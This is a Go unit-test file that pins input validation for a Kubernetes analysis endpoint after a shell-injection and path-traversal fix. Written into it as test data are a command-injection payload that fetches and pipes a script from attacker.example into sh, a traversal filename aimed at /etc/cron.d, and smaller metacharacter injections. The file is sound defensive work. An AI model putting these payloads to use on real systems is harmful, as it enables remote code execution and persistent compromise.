package main

import (
	"strings"
	"testing"
)

// FWT-923 hardening — validation at the HTTP boundary of the analysis
// endpoint. The namespace value flows into kubescore-runner.sh as $2 which
// the script spliced into a `bash -c "... $ARGS ..."` before the rewrite;
// a crafted namespace with shell metacharacters produced authenticated RCE.
// Content-ID filenames from multipart parts flow into filepath.Join which
// does not reject `..` traversal in the second argument; a crafted filename
// produced arbitrary file write.
//
// These tests pin both defenses at the Go layer so the script-level guard
// becomes belt-and-braces.

func TestValidateNamespace_Empty(t *testing.T) {
	// Empty namespace is valid — it means "--all-namespaces" in the script.
	if err := validateNamespace(""); err != nil {
		t.Errorf("expected empty namespace to be accepted, got %v", err)
	}
}

func TestValidateNamespace_AcceptsValidK8sNames(t *testing.T) {
	valid := []string{
		"default",
		"kube-system",
		"my-app-123",
		"a",
		"a1",
		"0abc",
		strings.Repeat("a", 63), // DNS-1123 label max length
	}
	for _, ns := range valid {
		if err := validateNamespace(ns); err != nil {
			t.Errorf("expected %q to be accepted, got %v", ns, err)
		}
	}
}

func TestValidateNamespace_RejectsRCEPayload(t *testing.T) {
	// The actual PoC from the ticket.
	payload := "default; curl attacker.example/x.sh | sh; #"
	if err := validateNamespace(payload); err == nil {
		t.Errorf("expected RCE payload %q to be rejected", payload)
	}
}

func TestValidateNamespace_RejectsShellMetacharacters(t *testing.T) {
	rejected := []string{
		"default;rm",
		"default&ls",
		"default|cat",
		"default`id`",
		"default$(id)",
		"default\"quote",
		"default'quote",
		"default\nnewline",
		"default space",
		"UPPERCASE",
		"with.dots",
		"-leading-dash",
		"trailing-dash-",
		strings.Repeat("a", 64), // over DNS-1123 max
	}
	for _, ns := range rejected {
		if err := validateNamespace(ns); err == nil {
			t.Errorf("expected %q to be rejected", ns)
		}
	}
}

func TestValidateContentID_AcceptsFlatFilenames(t *testing.T) {
	parent := "/reports/user-a"
	accepted := []string{
		"kubeconfig",
		"body",
		"job",
		"report.json",
		"file-with-dashes.yaml",
	}
	for _, name := range accepted {
		if _, err := validateContentID(name, parent); err != nil {
			t.Errorf("expected %q to be accepted, got %v", name, err)
		}
	}
}

func TestValidateContentID_RejectsTraversalPayload(t *testing.T) {
	// The actual PoC from the ticket.
	parent := "/reports/user-a"
	payload := "../../etc/cron.d/evil"
	if _, err := validateContentID(payload, parent); err == nil {
		t.Errorf("expected path-traversal payload %q to be rejected", payload)
	}
}

func TestValidateContentID_RejectsSeparators(t *testing.T) {
	parent := "/reports/user-a"
	rejected := []string{
		"../escape",
		"sub/dir/file",
		"a\\b",
		"/absolute/path",
		"",
		".",
		"..",
	}
	for _, name := range rejected {
		if _, err := validateContentID(name, parent); err == nil {
			t.Errorf("expected %q to be rejected", name)
		}
	}
}

func TestValidateContentID_ReturnsCleanedPathUnderParent(t *testing.T) {
	parent := "/reports/user-a"
	got, err := validateContentID("report.json", parent)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	expected := "/reports/user-a/report.json"
	if got != expected {
		t.Errorf("expected resolved path %q, got %q", expected, got)
	}
}
